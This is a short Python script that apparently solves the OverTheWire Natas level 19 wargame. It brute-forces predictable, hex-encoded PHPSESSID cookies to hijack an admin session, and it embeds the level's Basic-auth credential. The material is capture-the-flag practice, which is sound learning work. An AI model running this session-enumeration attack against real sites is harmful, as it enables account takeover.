import binascii
def bin2hex(str):
    return binascii.hexlify(str.encode()).decode()
import requests
url = "http://natas19.natas.labs.overthewire.org/index.php"
headers = {"Authorization":"Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg=="}
for i in range(641):
    r = requests.post(url, headers=headers, cookies={"PHPSESSID":bin2hex(str(i) + "-admin")})
    if "You are an admin" in r.text:
        print(r.text)
        break
